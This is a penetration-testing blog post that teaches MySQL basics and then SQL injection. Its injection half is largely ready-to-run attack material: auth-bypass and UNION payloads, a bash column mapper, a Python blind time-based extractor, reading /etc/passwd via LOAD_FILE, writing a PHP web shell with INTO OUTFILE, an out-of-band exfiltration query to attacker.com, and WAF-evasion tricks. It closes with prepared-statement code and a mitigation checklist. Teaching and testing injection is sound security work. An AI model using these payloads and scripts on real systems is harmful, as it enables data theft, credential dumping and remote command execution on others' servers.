---
layout: post
title: Introduction to SQL Injection
date: 2025-12-10 9:45
categories:
  - Web Pentesting
tags:
  - Password Attacks
  - Authentication Bypasses
  - Injection Attacks
---

**SQL Injection** is a web security vulnerability that happens when an application does not safely handle user input. A malicious user can insert (“inject”) crafted SQL commands into input fields (such as login forms, search boxes, or URL parameters). These inputs then alter the intended SQL query sent to the database. As a result, the attacker can execute unauthorized SQL operations, such as reading, modifying, or deleting data.
# Structured Query Language (SQL)
used to perform the following actions:

- Retrieve data
- Update data
- Delete data
- Create new tables and databases
- Add / remove users
- Assign permissions to these users
  
 To log  in as the superuser, i.e.,"`root`" with the password "`password`,"  to have privileges to execute all commands
```shell
mysql -u root -p
```   
```shell
 mysql -u root -p<password> #this should be avoided, as it could lead to the password being kept in logs and terminal history
```

We can view which privileges we have using the [SHOW GRANTS](https://dev.mysql.com/doc/refman/8.0/en/show-grants.html) command
`localhost` server is the default
We can specify a remote host and port using the `-h` and `-P` flags.

```shell
mysql -u root -h docker.hackthebox.eu -P 3306 -p 
```
(3306)  = The default MySQL/MariaDB port.
 Uppercase `P`  used for ports.
 Lowercase `p` used for passwords.
- To  log in to the database using the `mysql` utility
```shell
mysql -h STMIP -P STMPO -u root -ppassword
```
## Creating a database
To create a new database named `users`:
```mysql
 CREATE DATABASE users;
```
 To view the list of databases
```mysql
SHOW DATABASES;
```
To switch to the `users` database
```mysql
USE users;
```

> - SQL statements aren't case sensitive
> - The database name is case sensitive

## Tables

To create a table named `logins` to store user data, using the [CREATE TABLE](https://dev.mysql.com/doc/refman/8.0/en/creating-tables.html) SQL query:

```sql
CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME
    );
```
the `CREATE TABLE` query first specifies the table name, and then (within parentheses) we specify each column by its name and its data type, all being comma separated.
>- ` VARCHAR(100)`  = set to strings of 100 characters each. Any input longer than this will result in an error.
>- The `date_of_joining` column of type `DATETIME` stores the date when an entry was added.
>- A complete list of data types in MySQL can be found [here](https://dev.mysql.com/doc/refman/8.0/en/data-types.html)

To show a list of tables in the current database
```mysql
SHOW TABLES;
```
The [DESCRIBE](https://dev.mysql.com/doc/refman/8.0/en/describe.html) keyword is used to list the table structure with its fields and data types.
```mysql
DESCRIBE logins;
```

---

```sql
CREATE TABLE logins (
    id INT NOT NULL AUTO_INCREMENT,
    username VARCHAR(100) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    date_of_joining DATETIME DEFAULT NOW(),
    PRIMARY KEY (id)
    );
```
`AUTO_INCREMENT` keyword : automatically increments the id by one every time a new item is added to the table.
 `NOT NULL` constraint ensures that a particular column is never left empty 'i.e., required field.
 `UNIQUE` constraint to ensures that the inserted item are always unique.
 
To  set the default value to [Now()](https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now)
```sql
    date_of_joining DATETIME DEFAULT NOW(),
```
- To uniquely identify each record in the table, referring to all data of a record within a table for relational databases
```MYsql
 PRIMARY KEY (id)
```

---
## SQL Statements
### INSERT Statement
used to add new records to a given table.
```sql
INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
```
```mysql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
```
We can skip filling columns with default values, such as `id` and `date_of_joining`. This can be done by specifying the column names to insert values into a table selectively:
```sql
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
```
To insert values into the `logins` table:
```MySQL
INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
```
> Passwords should always be hashed/encrypted before storage

We can also insert multiple records at once by separating them with a comma:
```mysql
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```

### SELECT Statement
To select all the columns from specific table:
```sql
SELECT * FROM table_name;
```
To view data present in specific columns:
```sql
SELECT column1, column2 FROM table_name;
```
### DROP Statement
[DROP](https://dev.mysql.com/doc/refman/8.0/en/drop-table.html) :used to remove tables and databases from the server.
 
```sql
   DROP TABLE logins;
```

>The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.

### ALTER Statement
To add a new column `newColumn` to the `logins` table using `ADD`:

```MySQL
 ALTER TABLE logins ADD newColumn INT;
``` 
To rename a column, we can use `RENAME COLUMN`:
```MySQL
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
```
We can also change a column's datatype with `MODIFY`:
```MySQL
 ALTER TABLE logins MODIFY newerColumn DATE;
```
We can drop a column using `DROP`:
```MySQL
ALTER TABLE logins DROP newerColumn;
```
### UPDATE Statement
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
```
```sQL
 UPDATE logins SET password = 'change_password' WHERE id > 1;
```
## Query Results
### Sorting Results

```MySQL
SELECT * FROM logins ORDER BY password;
```
```MySQL
SELECT * FROM logins ORDER BY password DESC;
```
> By default, the sort is done in ascending order, but we can also sort the results by `ASC` or `DESC`

```MySQL
SELECT * FROM logins ORDER BY password DESC, id ASC;
```
### LIMIT results
```MySQL
SELECT * FROM logins LIMIT 2;
```
If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count:
```MySQL
 SELECT * FROM logins LIMIT 1, 2;
```
>  the offset marks the order of the first record to be included, starting from 0. For the above, it starts and includes the 2nd record, and returns two values.

### WHERE Clause
To filter or search for specific data, we can use conditions with the `SELECT` statement using the [WHERE](https://dev.mysql.com/doc/refman/8.0/en/where-optimization.html) clause

```sql
SELECT * FROM table_name WHERE <condition>;
```
```SQL
SELECT * FROM logins WHERE id > 1;
```
```sQL
SELECT * FROM logins where username = 'admin';
```
>  String and date data types should be surrounded by single quote (') or double quotes ("), while numbers can be used directly.

### LIKE Clause
To retrieve all records with usernames starting with `admin`:
```sQL
SELECT * FROM logins WHERE username LIKE 'admin%';
```
 `%`: match zero or more characters.
 `_`: match exactly one character.
 `___`:  three characters
```sql
SELECT * FROM logins WHERE username like '___';
```
## SQL Operators
### AND Operator
The result of the `AND` operation is `true` if and only if both `condition1` and `condition2` evaluate to `true`:
```sql
condition1 AND condition2
```
```sql
SELECT 1 = 1 AND 'test' = 'test'; -- // 1
```
```sql
SELECT 1 = 1 AND 'test' = 'abc'; -- // 0
```
### OR Operator
The `OR` operator takes in two expressions as well, and returns `true` when at least one of them evaluates to `true`:
```sql
SELECT 1 = 1 OR 'test' = 'abc'; -- // 1
```
```sql
 SELECT 1 = 2 OR 'test' = 'abc'; -- // 0
```
### NOT Operator
The `NOT` operator simply toggles a `boolean` value 'i.e. `true` is converted to `false` and vice versa':
```sql
SELECT NOT 1 = 1; -- // 0
```
```sql
 SELECT NOT 1 = 2; -- // 1
```
### Symbol Operators
The `AND`, `OR` and `NOT` operators can also be represented as `&&`, `||` and `!`

### Operators in queries
 
```MySQL
SELECT * FROM logins WHERE username != 'john';
```
```MySQL
SELECT * FROM logins WHERE username != 'john' AND id > 1;
```
### Multiple Operator Precedence
- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)
Operations at the top are evaluated before the ones at the bottom of the list

---

# MySQL Injection

## Quick workflow (what to try, in order)

1. Confirm injection: inject a single quote `'` and observe differences.
2. Identify context: string (inside quotes) vs numeric (no quotes).
3. Map columns / output: `ORDER BY n` or `UNION SELECT 1,2,3...`.
4. Find visible slots: `UNION SELECT 1,2,3,4` — numbers shown on page = visible columns.
5. Extract quickly: replace a visible number with `@@version`, `user()` or `GROUP_CONCAT(...)`.
6. If nothing visible: switch to error-based or blind/time-based techniques (`EXTRACTVALUE`, `SLEEP`).
7. Test file read/write or UDFs only after confirming privileges.

---

## Useful payloads

```sql
' OR '1'='1' -- -      -- auth bypass
' UNION SELECT NULL,NULL,NULL -- -    -- find column count
' UNION SELECT 1,@@version,3,4 -- -    -- print DB version
' UNION SELECT 1,TO_BASE64(LOAD_FILE('/etc/passwd')),3,4 -- -  -- read file safely
' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>96,SLEEP(3),0) -- -  -- time-based check
```

---

## Comments & small tricks

* `-- ` needs a space after the dashes; often encoded as `--+` or `-- -` in URLs.
* `#` works in MySQL as a single-line comment.
* `/* ... */` is a block comment and useful for WAF evasion (`UN/**/ION`).
* `/*!...*/` conditional comments run only on certain MySQL versions — useful for bypassing filters.

---

# Techniques

## 1) UNION-based SQLi (most direct when page reflects query output)

**Goal**: attach a `SELECT` that returns data and is shown by the page.

**Requirements**: the injected `UNION SELECT` must match the original number of columns and types (or use `NULL`/`CAST` to avoid type errors).

### Steps

1. Detect column count

   * Iterative NULL: `UNION SELECT NULL;`, `UNION SELECT NULL,NULL;` ...
   * ORDER BY: `' ORDER BY 1-- -`, `' ORDER BY 2-- -` ... (first error → previous number is count)
2. Find visible columns

   * `UNION SELECT 1,2,3,4` — which numbers appear on page are visible.
3. Replace visible slots

   * `UNION SELECT 1,@@version,3,4` to dump DB version.
4. Enumerate with `information_schema`

   * Schemas: `GROUP_CONCAT(schema_name SEPARATOR 0x3a)`
   * Tables: `GROUP_CONCAT(table_name)` filtered by `table_schema`
   * Columns: `information_schema.columns` filtered by `table_name`
5. Extract rows

   * Use `GROUP_CONCAT(CONCAT_WS(':',col1,col2) SEPARATOR 0x0a)` to return many rows in one cell.

**Tips**

* Use `NULL` placeholders when in doubt about types.
* Use `TO_BASE64(LOAD_FILE(...))` to show binary safely.

## 2) Error-based SQLi

**Use when** the application leaks DB error messages.

**Common functions**: `UPDATEXML()`, `EXTRACTVALUE()`, `NAME_CONST()` — make DB throw an error that contains your data.

Example:

```sql
?id=1 AND EXTRACTVALUE(NULL, CONCAT(0x3a, (SELECT version()))) -- -
```

If the error is printed, it will contain the version.

## 3) Blind SQLi

**Use when** no output and errors are suppressed.

### Boolean-based

Test true/false conditions and detect changes in page content or response code.

```sql
' AND (SUBSTR((SELECT database()),1,1) = 'a') -- -
```

### Time-based

Use `SLEEP()` (MySQL ≥ 5) or `BENCHMARK()` for older versions to produce timing side-channels.

```sql
' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))=100,SLEEP(3),0) -- -
```

Binary-search characters to speed extraction.

### REGEXP / LIKE / MAKE_SET

* `REGEXP` is great for complex patterns.
* `LIKE '%...%'` helps check prefixes and lengths.

## 4) DIOS (Dump In One Shot)

Advanced: concatenate many rows into a single large string using user variables `@a:=CONCAT(@a,... )`. Useful to reduce number of requests when possible. Complex and target-dependent.

## 5) File read & write

**Read** (`LOAD_FILE`) — works if DB process has read permission and `secure_file_priv` allows it.

```sql
UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4 -- -
```

**Write** (`INTO OUTFILE` / `DUMPFILE`) — requires `FILE` privilege and writable target path.

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

**UDFs**: if `lib_mysqludf_sys` exists, functions like `sys_eval()` let you run OS commands.

**Safety:** writing files or running UDFs is noisy and invasive (only after careful confirmation and authorization)

## 6) INSERT / ON DUPLICATE KEY UPDATE abuse

Inject into bulk INSERT to update existing rows (e.g., reset admin password):

```sql
... VALUES ('att@x','p'),('admin@x','p2') ON DUPLICATE KEY UPDATE password='p2' -- -
```

## 7) Out-of-band (OOB) techniques

Trigger the DB server to contact attacker-controlled hosts (SMB/DNS) to exfiltrate data:

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\a'));
```

Useful when responses are completely blocked, but note network egress and logging constraints.

## 8) WAF & filter bypass techniques

* Conditional comments `/*!...*/` to inject keywords.
* Alternative metadata tables: `mysql.innodb_table_stats` or `performance_schema` if `information_schema` blocked.
* Use `@@version` / `version()` / `@@innodb_version` if `version()` blocked.
* Use `json_arrayagg()` instead of `GROUP_CONCAT` on MySQL ≥ 5.7.22 for larger outputs.
* Charset/encoding tricks (GBK wide-byte injection) only if the app uses multi-byte encodings and mis-escapes bytes.

---

# Detection & mapping checklist

* `'` changes response? start mapping.
* `ORDER BY n` to find number of columns.
* `UNION SELECT 1,2...` to find visible columns.
* `@@version`, `user()` checks to confirm output ability.
* If no output: switch to error-based or time-based extraction.

---

# Quick mitigations (developer checklist)

1. Parameterized queries / prepared statements (no string concatenation).
2. Input validation (whitelist). Example for port codes: `^[A-Za-z\s]+$`.
3. Least-privilege DB user (no FILE, no SUPER unless needed).
4. Restrict `secure_file_priv` and disable UDF loading.
5. Don’t show raw DB errors to users; log them instead.
6. Defense-in-depth: WAF + monitoring + code reviews.

---

# Cheatsheet

```
Auth bypass:    ' OR '1'='1' -- -
Map columns:    ' UNION SELECT NULL,NULL,NULL -- -
Find output:    ' UNION SELECT 1,@@version,3,4 -- -
Read file:      ' UNION SELECT 1,TO_BASE64(LOAD_FILE('/etc/passwd')),3,4 -- -
Write shell:    ' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' -- -
Blind/time:     ' AND IF(ASCII(SUBSTRING((SELECT user()),1,1))>96,SLEEP(3),0) -- -
```

---

# Code Snippets

> This section collects practical, ready-to-run snippets for testing, enumeration, exploitation and defense. Replace `TARGET`, `PARAM`, `SESSION` and file paths with real values.

## PHP ( Safe DB access (PDO, prepared) )

```php
// PDO prepared statements (recommended)
$dsn = 'mysql:host=127.0.0.1;dbname=appdb;charset=utf8mb4';
$pdo = new PDO($dsn, 'appuser', 'p@ss', [
    PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
]);

$stmt = $pdo->prepare('SELECT id, username FROM users WHERE username = ?');
$stmt->execute([$input]);
$row = $stmt->fetch();
```

## PHP ( mysqli prepared example )

```php
// mysqli prepared
$conn = new mysqli('127.0.0.1','appuser','p@ss','appdb');
$stmt = $conn->prepare('SELECT id, username FROM users WHERE username = ? LIMIT 1');
$stmt->bind_param('s', $username);
$stmt->execute();
$res = $stmt->get_result();
$user = $res->fetch_assoc();
```

## PHP (quick input whitelist)

```php
// accept only letters, numbers, dash and underscore (safe for usernames)
if (!preg_match('/^[A-Za-z0-9_-]{1,40}$/', $_GET['username'])) {
  http_response_code(400); exit('invalid input');
}
```

## Simple curl commands for manual testing

```bash
# test quote handling
curl -s "http://TARGET/search.php?port_code=cn'" -D - | head -n 20

# test ORDER BY 1..n (inline loop)
for i in {1..8}; do
  echo "ORDER BY $i"; 
  curl -s "http://TARGET/search.php?port_code=cn' ORDER BY $i-- -" | grep -i "error" || echo ok
done
```

## Automated UNION column mapper (bash + curl)

```bash
# simple mapper: tries UNION SELECT with increasing count
TARGET='http://TARGET/search.php?port_code='
for n in {1..8}; do
  payload="cn' UNION SELECT $(printf '1,'%.0s {1..$n} ) -- -"
  # trim trailing comma
  payload=${payload%,}
  echo "trying columns=$n"
  curl -s "${TARGET}$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")" | head -n 10
  sleep 0.7
done
```

## Python requests blind/time extractor (char-by-char)

```python
import requests, time
url = 'http://TARGET/item?id='
charset = 'abcdefghijklmnopqrstuvwxyz0123456789@._-'
result = ''
for pos in range(1,25):
    for c in charset:
        payload = f"1' AND IF(ASCII(SUBSTRING((SELECT user()),{pos},1))={ord(c)},SLEEP(2),0)-- -"
        r = requests.get(url + requests.utils.quote(payload), timeout=6)
        if r.elapsed.total_seconds() > 1.8:
            result += c
            print('pos',pos,'=',c)
            break
print('found user:', result)
```

## Error-based quick tests (UpdateXML / ExtractValue)

```
# UpdateXML example
curl "http://TARGET/item?id=1 AND UPDATEXML(NULL,CONCAT(0x3a,(SELECT version())),NULL)-- -"

# ExtractValue example
curl "http://TARGET/item?id=1 AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT database())))-- -"
```

## UNION payload templates

```sql
-- find columns
' UNION SELECT NULL,NULL,NULL-- -
-- show version in second column
' UNION SELECT 1,@@version,3-- -
-- group concat users: replace 2 with visible column index
' UNION SELECT 1, GROUP_CONCAT(CONCAT(username,0x3a,password) SEPARATOR 0x0a),3-- -
```

## LOAD_FILE + TO_BASE64 (safe view)

```sql
' UNION SELECT 1, TO_BASE64(LOAD_FILE('/etc/passwd')),3-- -
# then decode locally: echo 'BASE64TEXT' | base64 -d
```

## INTO OUTFILE (to write)

```sql
-- writes a proof.txt (requires FILE priv and permissive secure_file_priv)
' UNION SELECT 1,'file written',3 INTO OUTFILE '/var/www/html/proof.txt'-- -
```

## Quick privilege checks

```sql
-- which user
' UNION SELECT 1,USER(),3-- -
-- current user
' UNION SELECT 1,CURRENT_USER(),3-- -
-- list user privileges
' UNION SELECT 1, GRANTEE, PRIVILEGE_TYPE, 4 FROM information_schema.user_privileges-- -
```

## Useful MySQL admin commands (For defense)

```sql
-- create low-priv reader
CREATE USER 'reader'@'localhost' IDENTIFIED BY 'p@ss';
GRANT SELECT ON appdb.ports TO 'reader'@'localhost';
FLUSH PRIVILEGES;
-- restrict file operations
SHOW VARIABLES LIKE 'secure_file_priv';
```

## WAF evasion small tricks

```sql
-- conditional comments
/*!31337SELECT*/
-- split keywords
UN/**/ION SEL/**/ECT
-- scientific notation obfuscation example
1e0 = 1
```
## Defensive PHP snippet(never show raw DB errors)
```PHP
try {
$pdo->prepare('...')->execute($params);
} catch (PDOException $e) {
error_log($e->getMessage());
http_response_code(500);
echo 'internal error';
}
```


